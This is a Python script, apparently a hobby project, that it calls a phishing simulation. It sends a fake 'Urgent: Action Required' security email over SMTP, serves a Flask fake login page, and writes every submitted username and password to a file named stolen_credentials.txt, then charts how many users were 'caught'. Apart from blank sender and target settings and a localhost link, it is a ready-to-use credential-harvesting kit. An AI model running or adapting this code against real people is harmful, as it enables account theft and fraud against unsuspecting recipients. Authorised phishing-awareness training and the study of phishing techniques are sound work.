# This is a module which we using to sending email by connecting to smtp server
import smtplib
from email.mime.multipart import  MIMEMultipart
from email.mime.text import MIMEText

from flask import Flask,request, render_template_string
import matplotlib.pyplot as plt
import threading
import os

# now this line i'm using for flask initilization
app = Flask(__name__)


# SMTP Server Configuration (Gmail example)
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587


# Here we add sender email

SENDER_EMAIL = ''
SENDER_PASSWORD = ''

# NOW HERE WE ADD TARGET EMAIL

RECEIVER_EMAIL = ''
CREDENTIALS_FILE = 'stolen_credentials.txt'

# Fake Login Page Template
fake_login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: blue;
            color: white;
            border: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="/steal_credentials" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""



def send_phishing_email():
    try:
        # Set up the server connection
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()

        # now here log in server using sender email
        server.login(SENDER_EMAIL, SENDER_PASSWORD)


        # now lets create the phishing email.
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = 'Urgent: Action Required!'

        # Phishing email body
        body = """
        Dear user,
        
        We've detected suspicious activity in your account. Please click the link below to verify your identity:

        [Fake Login Page](http://localhost:5000/)
        

        Regards,
        Security Team
        """
        msg.attach((MIMEText(body,'plain')))

        # Send the email
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())

        server.quit()

        print("Phishing email sent successfully!")
    except Exception as e:
        print(f"Error:{e}")

send_phishing_email()


# now this function is to for display using matplot lib.

def plot_phishing_result():
    if not os.path.exists(CREDENTIALS_FILE):
        print(" No credentials stolen yet")
        return

    # Read the stolen file
    with open(CREDENTIALS_FILE,'r') as file:
        data = file.readlines()

        total_users = 100  # For the sake of simulation, assume 100 users
        caught_users = len(data)  # Number of users caught in the phishing simulation

        # Data for the pie chart
        labels = ['Caught in Phishing', 'Not Caught']
        sizes = [caught_users, total_users - caught_users]
        colors = ['#ff6666', '#66b3ff']

        # Plot the pie chart
        plt.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
        plt.title('Phishing Simulation Results')
        plt.show()


# form im support fake login page using flask
@app.route('/')
def login_page():
    return render_template_string(fake_login_page)

# Handle the stolen credentials
@app.route('/steal_credentials', methods=['POST'])
def steal_credentials():
    username = request.form['username']
    password = request.form['password']

    # Log stolen credentials to a file
    with open(CREDENTIALS_FILE, 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return "Login failed. Please try again."


# now we start flask app in seprate thread
def start_flask_app():
    app.run(debug=True, use_reloader=False)


def plot_phishing_results():
    pass


def run_simulation():
    # Start the Flask server in a separate thread
    flask_thread = threading.Thread(target=start_flask_app)
    flask_thread.start()

    # Send the phishing email
    send_phishing_email()

    # Wait for the server to start and users to interact
    input("Press Enter after phishing simulation is complete to view the results...")

    # Plot the phishing results
    plot_phishing_result()

if __name__ == '__main__':
    run_simulation()